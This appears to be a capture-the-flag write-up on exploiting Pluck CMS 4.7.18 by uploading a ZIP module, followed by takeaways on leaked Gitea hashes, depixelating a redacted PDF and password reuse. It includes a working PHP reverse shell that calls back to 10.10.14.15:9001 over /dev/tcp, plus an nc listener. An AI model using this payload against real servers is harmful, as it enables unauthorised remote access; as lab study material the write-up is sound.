Pluck 4.7.18 RCE — Malicious Module Upload

Pluck CMS 4.7.18 allows uploading ZIP modules that can contain PHP files. Create a malicious module:

# Step 1: Create PHP reverse shell
$ mkdir -p shell_module
$ cat << 'EOF' > shell_module/shell.php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.15/9001 0>&1'");

EOF

# Step 2: Package as ZIP
$ cd shell_module && zip ../shell.zip shell.php && cd ..

# Step 3: Start listener
$ nc -lvnp 9001

Why depixelation works Pixelation replaces blocks of pixels with their average color. This is a lossy but deterministic transformation — the same input text with the same font always produces the same pixelated output. Depix works by comparing the pixelated blocks against a pre-computed lookup table of known character pixelation patterns. It's not 100% accurate, but for short strings with common fonts, it often recovers enough to guess the original text.

Appendix

Key Takeaways

Public Git repos leak credentials.

Gitea hosted the Pluck CMS source code including the password hash in pass.php. Always check for public repos on Gitea, GitLab, and similar self-hosted platforms.

CMS module upload = code execution.

Pluck, WordPress, Backdrop, Drupal — the pattern is identical: package a PHP shell as a module/plugin ZIP, upload through the admin panel, access the PHP file directly. This is a universal CMS attack vector.

Pixelation is NOT secure redaction.

Pixelated text can be recovered with tools like Depix. For secure redaction, use solid black rectangles that completely replace the underlying content — never use blur, pixelation, or semi-transparent overlays.

Always check home directory files carefully.

The PDF in junior's home directory was the key to root. Don't just grab user.txt and move on — enumerate every file in the user's home.

Password reuse chains through the entire box.

iloveyou1 worked for Pluck CMS, Gitea, and SSH. One cracked hash unlocked three services.

Gitea hash→crack → Pluck login→module upload RCE→SSH junior→depixelate PDF → root
